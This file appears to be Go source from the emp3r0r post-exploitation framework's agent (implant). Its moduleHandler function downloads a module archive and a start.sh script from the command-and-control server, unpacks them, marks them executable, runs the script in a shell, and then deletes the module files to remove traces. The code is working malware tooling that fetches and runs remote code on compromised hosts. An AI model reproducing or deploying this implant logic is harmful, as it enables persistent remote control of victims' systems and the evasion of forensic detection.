package agent

import (
	"fmt"
	"log"
	"os"
	"os/exec"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver/v3"
)

func moduleHandler(modName, checksum string) (out string) {
	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.xz"
	modDir := RuntimeConfig.AgentRoot + "/" + modName
	start_sh := modDir + "/start.sh"

	// if we have already downloaded the module, dont bother downloading again
	if tun.SHA256SumFile(tarball) != checksum {
		_, err := DownloadViaCC(modName+".tar.xz",
			tarball)
		if err != nil {
			return err.Error()
		}
	}

	if tun.SHA256SumFile(tarball) != checksum {
		log.Print("checksum failed, restarting...")
		os.RemoveAll(tarball)
		moduleHandler(modName, checksum)
	}

	// extract files
	os.RemoveAll(modDir)
	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
		return fmt.Sprintf("Unarchive module tarball: %v", err)
	}

	// download start.sh
	os.RemoveAll(start_sh)
	_, err := DownloadViaCC(modName+".sh",
		start_sh)
	if err != nil {
		return fmt.Sprintf("Downloading start.sh: %v", err)
	}

	// exec
	pwd, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("pwd: %v", err)
	}
	err = os.Chdir(modDir)
	if err != nil {
		return fmt.Sprintf("cd to module dir: %v", err)
	}

	// process files in module archive
	libs_tarball := "libs.tar.xz"
	files, err := os.ReadDir("./")
	if err != nil {
		return fmt.Sprintf("Processing module files: %v", err)
	}
	for _, f := range files {
		os.Chmod(f.Name(), 0700)
		if util.IsExist(libs_tarball) {
			os.RemoveAll("libs")
			err = archiver.Unarchive(libs_tarball, "./")
			if err != nil {
				return fmt.Sprintf("Unarchive %s: %v", libs_tarball, err)
			}
		}
	}

	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)

	// debug
	shdata, err := os.ReadFile(start_sh)
	if err != nil {
		log.Printf("Read %s: %v", start_sh, err)
	}
	log.Printf("Running start.sh:\n%s", shdata)

	outbytes, err := cmd.CombinedOutput()
	if err != nil {
		out = fmt.Sprintf("Running module: %s: %v", outbytes, err)
	}

	defer func() {
		os.Chdir(pwd)
		// remove module files if it's non-interactive
		if !util.IsStrInFile("echo emp3r0r-interactive-module", start_sh) {
			os.RemoveAll(modDir)
		}
	}()

	return string(outbytes)
}
